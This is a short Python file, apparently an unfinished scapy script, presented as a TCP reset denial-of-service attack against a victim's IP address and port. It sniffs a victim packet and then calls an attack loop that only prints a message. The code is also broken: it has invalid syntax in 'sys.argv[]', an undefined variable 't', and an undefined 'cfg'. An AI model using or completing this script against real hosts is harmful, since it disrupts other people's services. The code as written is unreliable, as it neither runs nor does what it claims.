'''
-----TCP RST Attack-----
Filename: tcp_rst.py
Author: s33r
Description: DOS for a particular service running on a particular port
             via tcp rst packets that attempt to increment seq number 
             to prevent proper communication

'''

import sys
import os

from scapy import *


interface = cfg.interface

def sniff_packet_stream(victim_ip, victim_port):
    #sniff a packet with given ip and port from victim
    pack = sniff(iface=interface, count=1, 
            lfilter= lambda x: x.haslayer(TCP) 
            and x[IP].src == victim_ip
            and t[TCP].sport == victim_port)

    return pack

def tcp_reset_attack(p, victim_ip, victim_port):
    #sniffed packet passed in as p
    try:
        while True:
            print("[*] Starting TCP Reset Attack")

        

    except KeyboardInterrupt:
        print("[*] Stopping TCP Reset Attack")
        exit()

if __name__ == '__main__':

    if len(sys.argv[]) < 3:
        print("Usage: python3 tcp_rst.py <victim_ip> <victim_port>")

    victim_ip = sys.argv[1]
    victim_port = sys.argv[2]

    sniffed_packet = sniff_packet_stream(victim_ip, victim_port)
    tcp_reset_attack(sniffed_packet, victim_ip, victim_port)



